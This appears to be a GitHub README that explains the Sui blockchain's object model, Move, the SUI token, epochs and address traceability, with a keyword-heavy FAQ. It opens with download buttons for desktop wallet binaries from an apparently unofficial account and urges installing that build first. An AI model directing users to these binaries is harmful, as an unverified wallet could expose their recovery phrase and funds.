![SUI Wallet](assets/banner-article.png)

# Understanding the Sui blockchain

Objects, epochs and a Move-based execution model, in the order a wallet user meets them.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Sui is a blockchain where the unit of data is an object with an owner, the programs that act on objects are
written in Move, and the native token SUI pays for transactions and secures the network by being staked. A
wallet on this network holds objects and signs transactions; everything else follows from those two facts.

## What a blockchain is doing here

A blockchain is a ledger that many machines agree on, where agreement is expensive to fake and cheap to
check. What you get for that cost is a record that does not depend on one company staying honest or in
business.

Sui's version of that record is built around objects rather than balances. An account's holdings are a set of
owned objects, and a transaction changes their owners rather than adjusting a number in a table.

## Why objects matter to you

Because "what do I own" becomes a question with a precise answer. A coin balance is a sum over coin objects;
an NFT is an object with contents; a name is an object with an owner; a staked position is an object tied to
a validator.

This is also why a wallet can be simple and still correct: read the objects, draw them, sign changes. Nothing
about your holdings is stored by the wallet itself.
[What is SUI Wallet for desktop?](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/what-is-sui-wallet-desktop.md) covers what that means for the application you actually use.

## Move, and why a language matters

Move is the language these programs are written in, and it was designed around objects: a function can take an object, change it, and pass it on, with the rules enforced by the language rather than by convention among programmers.

For a user the consequence is narrow but real. Objects declare what can be done to them - transfer, share,
burn - and a program cannot do what the declaration forbids. That is why some NFTs cannot be moved, and why
that is a rule rather than a bug in a wallet.

## What SUI the token is for

SUI pays for transactions, is staked to secure the network, and is used in the governance that decides changes. Those three uses are the reason a wallet needs some even when you only want to hold something else. All three uses share the one token.

Fees are small but not optional, and they are charged whether a transaction succeeds or fails, because the
work of checking it happened either way. Supply is a separate question from what the token does.

## Epochs, and why timing is odd

The network advances in epochs, and staking rewards, validator sets and some operations turn over at those
boundaries rather than continuously. That is why an unstake or a reward is not instant: the network is doing
it at a checkpoint it defines.

No page can give you a duration that holds, because the schedule belongs to the network rather than to a
guide. What you can rely on is the state: a position shows pending, then completes, and the screens say which of the two it is in.

## Can a wallet be traced?

Yes. Every transaction is public, permanent, and linked to the addresses involved. Anyone who connects an address to a person has connected that person's history to it as well, and that connection is not reversible afterwards. Addresses are pseudonymous at best.

That is not a flaw to be fixed; it is the property that makes the ledger checkable. The practical
consequence is that privacy on a public chain is about what you link to an address, not about what the
address hides. [Finding your SUI Wallet address](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/finding-your-sui-wallet-address.md) covers the address itself, which is public by
design.

## Does Sui have a future?

That is a forecast, and this page does not make them. What can be checked is the present: a live network with
transactions you can read, an object model with a documented language, and tooling that runs. Whether that
grows is a judgement about adoption, not a fact about the software.

Anyone who answers that question with certainty - in either direction - is selling something. The useful
version of the question is what you would need to see happen for the answer to change.

## Where a wallet fits

A wallet is the part of this you hold: it reads the chain, signs what you approve, and stores nothing that
matters except the phrase that derives your account. The rest is the network's work, and it continues whether
or not the application happens to be open at the time.

The current release from the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) is the one these
screens are described from, and the [repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop)
records how it changed. [How to send SUI from your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/how-to-send-sui-from-your-wallet.md) is the shortest useful transaction to
try once the model makes sense.

## FAQ

### What is sui crypto?

The native token of the Sui network, used to pay fees, to stake for security, and to take part in governance.
It is not a separate product from the network.

### What type of crypto is sui?

A layer-one blockchain token. The network is general purpose: it runs programs, and the token is what
transactions and staking are denominated in.

### Does Sui have its own wallet?

Yes, several exist, and this one is a desktop application for Windows, macOS and Linux rather than a browser
extension.

### How to use sui?

Install a wallet, write the 24 words on paper, receive some SUI to an address, and send a transaction. That
sequence teaches more than any explainer, including this one.

### What is Sui and why does it use the Move language?

Move was designed around objects, which is what Sui stores. A language built for the data model removes a
class of mistakes that other languages have to police at runtime.

### Can a crypto wallet be traced?

Every transaction on a public chain is traceable to addresses, permanently. Privacy depends on what is linked
to an address, not on the address concealing anything.
